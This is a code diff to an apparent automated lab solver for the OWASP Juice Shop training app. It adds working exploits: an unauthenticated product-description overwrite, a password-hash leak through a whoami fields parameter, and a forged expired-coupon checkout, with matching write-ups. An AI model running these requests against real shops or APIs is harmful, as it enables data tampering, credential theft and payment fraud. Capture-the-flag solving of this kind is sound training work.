@@ -507,6 +507,49 @@ def _socket_xss(c):
         pass
 
 
+def _product_tampering(c):
+    """Product Tampering: PUT /api/Products/:id is not auth-gated -- overwrite the O-Saft product's
+    description so its link href points at the configured owasp.slack.com URL."""
+    admin = _login(c, _ADMIN_SQLI, "x")
+    H = {"Authorization": "Bearer " + admin["token"]} if admin.get("token") else {}
+    oid = None
+    try:
+        for p in c.get("/rest/products/search", params={"q": "O-Saft"}).json().get("data", []):
+            if "O-Saft" in (p.get("name") or ""):
+                oid = p["id"]
+                break
+    except Exception:
+        return
+    if oid:
+        desc = '<a href="https://owasp.slack.com" target="_blank">More...</a>'
+        c.put("/api/Products/%d" % oid, json={"description": desc}, headers=H)
+
+
+def _password_hash_leak(c):
+    """Password Hash Leak: /rest/user/whoami reflects any field named in ?fields= straight off the
+    user record (cookie auth), so ?fields=password leaks the current user's password hash."""
+    auth = _login(c, "admin@juice-sh.op", "admin123")
+    tok = auth.get("token")
+    if tok:
+        c.get("/rest/user/whoami", params={"fields": "id,email,password"},
+              headers={"Cookie": "token=" + tok})
+
+
+def _expired_coupon(c):
+    """Expired Coupon: checkout accepts couponData = base64('<campaign>-<validOn>'); every built-in
+    campaign's validOn is in the past, so WMNSDY2019 redeems an expired campaign coupon."""
+    import base64
+    auth = _login(c, "admin@juice-sh.op", "admin123")
+    tok, bid = auth.get("token"), auth.get("bid")
+    if not tok or not bid:
+        return
+    H = {"Authorization": "Bearer " + tok}
+    validon = 1551999600000            # WMNSDY2019 = Mar 08 2019 00:00 GMT+0100 (expired), 75% off
+    coupon = base64.b64encode(("WMNSDY2019-%d" % validon).encode()).decode()
+    c.post("/api/BasketItems", json={"BasketId": bid, "ProductId": 1, "quantity": 1}, headers=H)
+    c.post("/rest/basket/%s/checkout" % bid, json={"couponData": coupon}, headers=H)
+
+
 def solve(base_url: str) -> dict:
     """Run the full Juice Shop lab solver against a live instance; report scoreboard delta."""
     try:
@@ -528,7 +571,8 @@ def solve(base_url: str) -> dict:
                      _socket_xss, _ephemeral_accountant, _retrieve_blueprint, _checkout_orders,
                      _forged_coupon, _two_factor, _feedback_patterns, _csrf, _change_bender,
                      _multiple_likes, _reflected_and_nosql, _api_and_header_xss, _serverside_xss,
-                     _allowlist_bypass, _privacy_and_jwt, _imaginary):
+                     _allowlist_bypass, _privacy_and_jwt, _imaginary,
+                     _product_tampering, _password_hash_leak, _expired_coupon):
             try:
                 step(c)
             except Exception:
@@ -658,6 +702,10 @@ SOLVE_MANIFEST = {
     "Privacy Policy": "Visit the privacy policy page",
     "Security Policy": "Fetch /.well-known/security.txt",
     "Security Advisory": "Locate the published security advisory",
+    # Frontier challenges cracked after launch (source-driven)
+    "Product Tampering": "Overwrite O-Saft's link href via the unguarded PUT /api/Products",
+    "Password Hash Leak": "Leak the password hash via /whoami?fields=password",
+    "Expired Coupon": "Redeem an expired campaign coupon via couponData",
 }
 
 # The full write-up per challenge -- the "adventure" narrative, readable in the Conquest tab.
@@ -766,6 +814,10 @@ SOLVE_DETAIL = {
     "Privacy Policy": "Visit /#/privacy-security/privacy-policy.",
     "Security Policy": "GET /.well-known/security.txt -- the standard security-contact file.",
     "Security Advisory": "Locate the published security advisory / CSAF document referenced by the app.",
+    # Frontier challenges cracked after launch (source-driven)
+    "Product Tampering": "PUT /api/Products/{osaft-id} isn't behind the auth guard, so overwrite the O-Saft product's description until its link reads <a href=\"https://owasp.slack.com\" target=\"_blank\"> and no longer contains the original owasp.org URL.",
+    "Password Hash Leak": "GET /rest/user/whoami?fields=id,email,password with the cookie token. The handler copies any requested field straight off the user record, so it hands back the logged-in user's password hash (the admin's is md5 of admin123).",
+    "Expired Coupon": "POST /rest/basket/{bid}/checkout with couponData = base64('WMNSDY2019-1551999600000'). Every built-in campaign coupon's validOn date is in the past, so the expired Women's-Day-2019 code (75% off) still redeems.",
 }
 
 # Why the remaining challenges are not taken -- the honest accounting behind the ceiling.
@@ -779,8 +831,7 @@ _REMAINING_BUCKET = {
     "NFT Takeover": "not_hosted", "Mint the Honey Pot": "not_hosted",
     "Wallet Depletion": "not_hosted", "Mass Dispel": "not_hosted",
     # Open frontier -- genuinely unsolved, still reachable
-    "SSRF": "frontier", "SSTi": "frontier", "Product Tampering": "frontier",
-    "Expired Coupon": "frontier", "Password Hash Leak": "frontier",
+    "SSRF": "frontier", "SSTi": "frontier",
     "GDPR Data Theft": "frontier", "Local File Read": "frontier",
     "Arbitrary File Write": "frontier", "Client-side XSS Protection": "frontier",
     "CSP Bypass": "frontier", "Video XSS": "frontier",
